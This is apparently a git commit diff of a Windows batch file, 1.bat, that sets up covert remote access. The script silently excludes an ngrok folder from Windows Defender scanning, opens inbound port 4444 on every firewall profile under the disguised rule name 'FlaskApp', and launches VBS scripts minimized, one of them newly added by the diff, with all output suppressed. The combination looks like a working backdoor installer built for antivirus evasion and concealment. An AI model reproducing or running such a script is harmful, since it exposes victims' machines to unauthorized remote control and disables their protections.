c732fb815154770c721677f3d09f6b8fc6c145ad
ofutpemata22 <gagi.cu.ci@gmail.com>
2025-04-24 13:45:46 +0300

    a

--- 1.bat
+++ 1.bat
@@ -1,11 +1,14 @@
 @echo off
+setlocal
+
 for /f "tokens=*" %%a in ('echo %USERNAME%') do set USERNAME=%%a
 set "NGROK_PATH=C:\Users\%USERNAME%\AppData\Local\ngrok"
 
 powershell -Command "$ngrokPath = '%NGROK_PATH%'; Add-MpPreference -ExclusionPath $ngrokPath" >nul 2>&1
 powershell -Command "New-NetFirewallRule -DisplayName 'FlaskApp' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any -EdgeTraversalPolicy Allow" >nul 2>&1
 
-start "" "%NGROK_PATH%\nt.vbs"
+start /min "" "%NGROK_PATH%\nt.vbs"
+start /min "" "%NGROK_PATH%\hst.vbs"
 
 :CHECK_DOTNET
 timeout /t 2 >nul
@@ -14,3 +17,5 @@ if exist "C:\Program Files\dotnet" (
     exit /b
 )
 goto CHECK_DOTNET
+
+endlocal
